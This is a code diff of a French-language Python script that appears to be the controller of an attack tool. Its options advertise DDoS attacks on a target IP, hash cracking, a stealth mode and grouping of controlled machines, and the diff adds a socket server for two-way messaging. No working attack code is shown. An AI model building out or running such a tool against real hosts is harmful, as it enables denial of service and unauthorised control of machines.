@@ -2,7 +2,43 @@ import socket
 from env import *
 import threading
 import argparse
+from queue import Queue
 
+
+
+
+# Fonctions
+
+
+
+def co(host, port):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((host, port))
+        s.listen()
+        print("ecoute sur : " + str(host) + ":" + str(port))
+        conn, addr = s.accept()
+    return conn, addr
+
+
+def emission(conn, addr):
+    while True:
+        message = input("Message :")
+        conn.sendall(message.encode())
+        if message == 'quitter':
+            break
+
+
+def reception(conn, addr):
+    print("Connection de :::: ", addr)
+    while True:
+        data = conn.recv(1024)
+        if not data:
+            break
+        print(f" Client: {data.decode()}")
+
+
+
+# Fin fonctions
 
 
 
@@ -28,6 +64,9 @@ parser = argparse.ArgumentParser()
 # Groupe mutuellement exclusif pour les attaques
 action_group = parser.add_mutually_exclusive_group()
 
+# Démarrage du serveur
+action_group.add_argument("--start", action="store_true", help="démarre le serveur")
+
 # Arguments spécifiques à l'attaque DDoS
 action_group.add_argument("--ddos", action="store_true", help="lance une attaque ddos sur un ordinateur")
 
@@ -51,7 +90,8 @@ action_group.add_argument("--no-stealth", action="store_true",  help="Désactive
 action_group.add_argument("--multi-task", action="store_true",  help="Active le mode multi-task sur une ou plusieurs machines. Permet de lancer plusieurs taches en même temps")
 action_group.add_argument("--no-multi-task", action="store_true",  help="Désactive le mode multi-task sur une ou plusieurs machines. Limite les taches à une seule à la fois")
 
-
+# Arguments pour les différentes attaques
+parser.add_argument("--port", type=int, help="démarre le serveur sur le port suivant")
 parser.add_argument("--address", type=str, help="adresse ip de l'ordinateur à attaquer")
 parser.add_argument("--time", type=int, help="temps de l'attaque ddos en seconde")
 parser.add_argument("--hash", type=str, help="hash à cracker")
@@ -74,9 +114,6 @@ group_or_host.add_argument("-H", "--host", type=str, help="permet de sélectionn
 
 
 args = parser.parse_args()
-
-
-
 
 if args.ddos:
     if not args.address or not args.time:
@@ -162,22 +199,42 @@ elif args.list_host:
 elif args.list_group:
     if args.host or args.group:
         parser.error("--list-group n'accepte pas les arguments --host et --group")
-    print("liste des groupes d'ordinateurs")
+    else:
+        print("liste des groupes d'ordinateurs")
 
 
 elif args.create_group:
     if args.host or args.group:
         parser.error("--create-group n'accepte pas les arguments --host et --group")
-    print("création du groupe " + args.create_group[0] + " avec les ordinateurs " + args.create_group[1])
+    else:
+        print("création du groupe " + args.create_group[0] + " avec les ordinateurs " + args.create_group[1])
 
 
 elif args.delete_group:
     if args.host or args.group:
         parser.error("--delete-group n'accepte pas les arguments --host et --group")
-    print("suppression du groupe " + args.delete_group)
+    else:
+        print("suppression du groupe " + args.delete_group)
 
 
-exit(0)
+elif args.start:
+    if not args.port or args.port < 1023 or args.port > 65535:
+        parser.error("--start nécessite l'argument --port compris entre 1023 et 65535")
+    else:
+        print("démarrage du serveur sur le port " + str(args.port))
+
+
+        running = True
+
+        while running:
+            # Création de la connexion
+            conn, addr = co("127.0.0.1", args.port)
+
+            thread_emission = threading.Thread(target=emission, args=(conn, addr))
+            thread_reception = threading.Thread(target=reception, args=(conn, addr))
+
+            thread_emission.start()
+            thread_reception.start()
 
 
 
@@ -185,40 +242,56 @@ exit(0)
 
 
 
-def co():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((HOST, PORT))
-        s.listen()
-        print("ecoute sur : " + str(HOST) + ":" + str(PORT))
-        conn, addr = s.accept()
-    return conn, addr
 
 
-def emission(conn, addr):
-    while True:
-        message = input("Message :")
-        conn.sendall(message.encode())
-        if message == 'quitter':
-            break
 
 
-def reception(conn, addr):
-    print("Connection de :::: ", addr)
-    while True:
-        data = conn.recv(1024)
-        if not data:
-            break
-        print(f" Client: {data.decode()}")
 
 
-def main():
-    conn, addr = co()
-
-    thread_emission = threading.Thread(target=emission, args=(conn, addr))
-    thread_reception = threading.Thread(target=reception, args=(conn, addr))
-    thread_emission.start()
-    thread_reception.start()
 
 
-if __name__ == "__main__":
-    main()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+else :
+    parser.error("no action specified. Use -h/--help for help")
